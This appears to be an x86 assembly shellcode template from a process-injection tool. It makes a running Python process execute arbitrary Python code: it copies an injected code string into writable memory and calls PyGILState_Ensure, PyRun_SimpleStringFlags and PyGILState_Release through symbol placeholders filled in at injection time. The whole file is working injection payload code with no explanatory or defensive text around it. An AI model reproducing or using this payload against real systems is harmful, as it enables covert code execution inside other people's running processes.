jmp execute_python_code_main

execute_python_code_main:
	
	// copy the Python string to arbitrary read/write memory
	mov edi, [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
	# set ESI to the address of the Python code string
	call execute_python_code_get_next
execute_python_code_get_next:
	pop esi
	add esi, 6
	jmp execute_python_code_copy_code

python_code:
	.ascii "[VARIABLE:pythoncode:VARIABLE]\0"

execute_python_code_copy_code:

	mov edi, [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
	add edi, 32
	push ecx
	mov ecx, [VARIABLE:pythoncode.length:VARIABLE]
	add ecx, 2												# null terminator
	rep movsb
	pop ecx
	// END: copy the Python string to arbitrary read/write memory

	// BEGIN: call PyGILState_Ensure() and store the handle it returns
	[INLINE:stack_align-ebx-eax-pre.s:INLINE]
	// keep 16 byte stack alignment
	// function argument count mod 4 == 0, so no extra adjustment necessary	
	mov ebx, [SYMBOL_ADDRESS:PyGILState_Ensure:IN_BINARY:.+/(lib|)python[0-9\.so]+$:SYMBOL_ADDRESS]
	call ebx
	mov ebx, [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
	mov [ebx], eax
	[INLINE:stack_align-ebx-eax-post.s:INLINE]
	// END: call PyGILState_Ensure()

	// BEGIN: call PyRun_SimpleString("arbitrary Python code here")
	push ebx
	[INLINE:stack_align-ebx-eax-pre.s:INLINE]
	// keep 16 byte stack alignment
	// function argument count mod 4 == 2, so subtract 0x8
	sub esp, 0x8
	
	push 0x0
	mov edi, [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
	add edi, 32
	push edi
	mov ebx, [SYMBOL_ADDRESS:PyRun_SimpleStringFlags:IN_BINARY:.+/(lib|)python[0-9\.so]+$:SYMBOL_ADDRESS]
	call ebx
	// pop two arguments + alignment placeholder off of stack:
	add esp, 0x10
	[INLINE:stack_align-ebx-eax-post.s:INLINE]
	pop ebx
	// END: call PyRun_SimpleString("arbitrary Python code here")
	
	// BEGIN: call PyGILState_Release(handle)
	[INLINE:stack_align-ebx-eax-pre.s:INLINE]
	// keep 16 byte stack alignment
	// function argument count mod 4 == 1, so subtract 0xc
	sub esp, 0xc
	mov ebx, [VARIABLE:ARBITRARY_READ_WRITE_DATA_ADDRESS:VARIABLE]
	mov ebx, [ebx]
	push ebx
	mov ebx, [SYMBOL_ADDRESS:PyGILState_Release:IN_BINARY:.+/(lib|)python[0-9\.so]+$:SYMBOL_ADDRESS]
	call ebx
	// pop one argument + alignment placeholder off of stack:
	add esp, 0x10
	[INLINE:stack_align-ebx-eax-post.s:INLINE]
	// END: call PyGILState_Release(handle)

SHELLCODE_SECTION_DELIMITER






